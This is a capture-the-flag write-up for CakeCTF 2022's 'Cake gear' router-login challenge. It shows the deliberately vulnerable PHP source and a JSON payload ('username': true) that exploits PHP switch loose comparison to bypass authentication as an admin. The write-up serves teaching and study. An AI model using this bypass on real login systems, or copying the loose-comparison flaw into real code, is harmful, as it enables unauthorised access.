# Cake gear

(I didn't solved it during the ctf, the writeup is based upon other people who have shared their solution so thanks to them)

Visiting the site http://web1.2022.cakectf.com:8005/ , shows the login page

![image](https://user-images.githubusercontent.com/31372554/188317708-97f1ef3d-907f-4734-8362-4be1c56142d5.png)


Login request looks like this:

```
POST / HTTP/1.1
Host: web1.2022.cakectf.com:8005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 39
Origin: http://web1.2022.cakectf.com:8005
Connection: close
Referer: http://web1.2022.cakectf.com:8005/
Cookie: session=eyJjc3JmX3Rva2VuIjoiMmY1ZGU1ZmJmZmNmODFmYWQ2NWJkYmQ2ZDUyNGQ2ODNjNjMwMzM3ZiIsInVzZXIiOiJzaGlybGV5cyJ9.YxQOog.QWOQS-Wj5lRHqNFrwuTqIvRDMX8; PHPSESSID=5abb07f87a3054791c20c7019c5e8de8

{"username":"admin","password":"admin"}
```

From view-source, in the javascript  code:

```js
         function login() {
             let error = document.getElementById('error-msg');
             let username = document.getElementById('username').value;
             let password = document.getElementById('password').value;
             let xhr = new XMLHttpRequest();
             xhr.addEventListener('load', function() {
                 let res = JSON.parse(this.response);
                 if (res.status === 'success') {
                     window.location.href = "/admin.php";
                 } else {
                     error.innerHTML = "Invalid credential";
                 }
             }, false);
             xhr.withCredentials = true;
             xhr.open('post', '/');
             xhr.send(JSON.stringify({ username, password }));
         }
```

We can see there's an endpoint `/admin.php` , http://web1.2022.cakectf.com:8005/admin.php but this also redirect us to the login page.So without wasting any more time let's look at the source code.

There are only two php files admin.php and index.php


index.php

```php
<?php
session_start();
$_SESSION = array();
define('ADMIN_PASSWORD', 'f365691b6e7d8bc4e043ff1b75dc660708c1040e');

/* Router login API */
$req = @json_decode(file_get_contents("php://input"));
if (isset($req->username) && isset($req->password)) {
    if ($req->username === 'godmode'
        && !in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])) {
        /* Debug mode is not allowed from outside the router */
        error_log("You failed....");
        $req->username = 'nobody';
    }

    error_log("Username:".$req->username);

    switch ($req->username) {
        case 'godmode':
            /* No password is required in god mode */
            $_SESSION['login'] = true;
            $_SESSION['admin'] = true;
            break;

        case 'admin':
            /* Secret password is required in admin mode */
            if (sha1($req->password) === ADMIN_PASSWORD) {
                $_SESSION['login'] = true;
                $_SESSION['admin'] = true;
            }
            break;

        case 'guest':
            /* Guest mode (low privilege) */
            if ($req->password === 'guest') {
                $_SESSION['login'] = true;
                $_SESSION['admin'] = false;
            }
            break;
    }

    /* Return response */
    if (isset($_SESSION['login']) && $_SESSION['login'] === true) {
        echo json_encode(array('status'=>'success'));
        exit;
    } else {
        echo json_encode(array('status'=>'error'));
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
    ............. strupping the html part

```

admin.php

```php
<?php
session_start();
if (empty($_SESSION['login']) || $_SESSION['login'] !== true) {
    header("Location: /index.php");
    exit;
}

if ($_SESSION['admin'] === true) {
    $mode = 'admin';
    $flag = file_get_contents("/flag.txt");
} else {
    $mode = 'guest';
    $flag = "***** Access Denied *****";
}
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>control panel - CAKEGEAR</title>
        <style>table, td { margin: auto; border: 1px solid #000; }</style>
    </head>
    <body style="text-align: center;">
        <h1>Router Control Panel</h1>
        <table><tbody>
            <tr><td><b>Status</b></td><td>UP</td></tr>
            <tr><td><b>Router IP</b></td><td>192.168.1.1</td></tr>
            <tr><td><b>Your IP</b></td><td>192.168.1.7</td></tr>
            <tr><td><b>Access Mode</b></td><td><?= $mode ?></td></tr>
            <tr><td><b>FLAG</b></td><td><?= $flag ?></td></tr>
        </tbody></table>
    </body>
</html>

```

As you can see that the flag is visible from the `/admin` endpoint, but there is check to validate whether the logged in user is `admin` or not. From this we can get a basic idea that , we probably need to somehow gain access to admin acc or something.

Back to the index.php file:

Inside the switch statement there are three cases for three diff users `admin` ,`guest`,`godmode`
The password for the guest username is `guest`, so let's try to see what's there

![image](https://user-images.githubusercontent.com/31372554/188317697-8ae4f5c4-cca5-447e-a818-393da5eed086.png)

The `godmode` username looks interesting so let's look more into this user,

section `1`
```php
$req = @json_decode(file_get_contents("php://input"));

if (isset($req->username) && isset($req->password)) {  
    if ($req->username === 'godmode'
        && !in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])) { //[1]
        /* Debug mode is not allowed from outside the router */
        error_log("You failed....");
        $req->username = 'nobody';
    }

    error_log("Username:".$req->username);

    switch ($req->username) {
        case 'godmode':
            /* No password is required in god mode */
            $_SESSION['login'] = true;
            $_SESSION['admin'] = true;
            break;
```

The `$req` variable basicaly contains the json data sent in the request body
If you want to know more about why they are using `php://input` here, then refer to this post from stackoverflow: https://stackoverflow.com/questions/8893574/php-php-input-vs-post


On line [1], the if condition checks for two things:

```php

$req->username === 'godmode'   // [2] 
!in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])  // [3]

```

First just checks if the username in the `$req` variable is equal to `godmode`
The second checks the client ip , whether it matches with `['127.0.0.1', '::1']` (basically they are checking if the request if coming from localhost or not, there's a `NOT` operator in front of it)

If both the conditions are true

```php
error_log("You failed....");
$req->username = 'nobody';
```

Then the *YOu failed....* message is displayed and the `username` is changed to `nobody`

Inside the switch case, if the `$req->username` returns the `godmode` username

```js
        case 'godmode':
            /* No password is required in god mode */
            $_SESSION['login'] = true;
            $_SESSION['admin'] = true;
            break;
```

This case will run, here from the comment you could see there is password requirement and also this is an `admin` too, perfect if we can somehow get login as `godmode` user we can get the flag




We can't login as the admin username as there's strict comparison (===) of the `admin` password, if there was a loose comparison then the exploitation method would have been different here. 

```php
        case 'admin':
            /* Secret password is required in admin mode */
            if (sha1($req->password) === ADMIN_PASSWORD) {
                $_SESSION['login'] = true;
                $_SESSION['admin'] = true;
            }
            break;
```

# Godmode user

If we want to get login as the `godmode` user , we must somehow fail this if check (line [1] section 1)

```php
!in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])
```
There is no way to spoof the ip in this case, if they were getting the client ip from headers such `X-Real-Ip` or something then we would have been able to add this header to our request and set it's value to `127.0.0.1` to make condition return false (NOT operator).


If there was some sort of parameter pollution bug here, which would return something else here so that the condition returns false
```php
$req->username === 'godmode'
```

And then here in the switch case it returns the `godmode` username, but sadly that's not possible here.

# Switch case (loose comparison)

Looking at the docs of the switch statement:
https://www.php.net/manual/en/control-structures.switch.php

Under a note section, it mentions that *Note that switch/case does loose comparison.*

Challenge Author's note:

![chrome_4pcIpU7hvJ](https://user-images.githubusercontent.com/31372554/188317819-bef4a10f-387d-40a7-8a68-1b2be3744549.png)

```php
php > echo  0 == "godmode";
1
php > echo  true == "godmode";
1
```


Cool, so now to solve the challenge we need to provide `true` for username value

```
POST / HTTP/1.1
Host: web1.2022.cakectf.com:8005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 38
Origin: http://web1.2022.cakectf.com:8005
Connection: close
Referer: http://web1.2022.cakectf.com:8005/


{"username":true,"password":"admin"}
```

Then visit the /admin.php endpoint and you will get the flag:

![image](https://user-images.githubusercontent.com/31372554/188317678-a165f8c7-4634-4a89-9c45-8bd3dacdcabd.png)
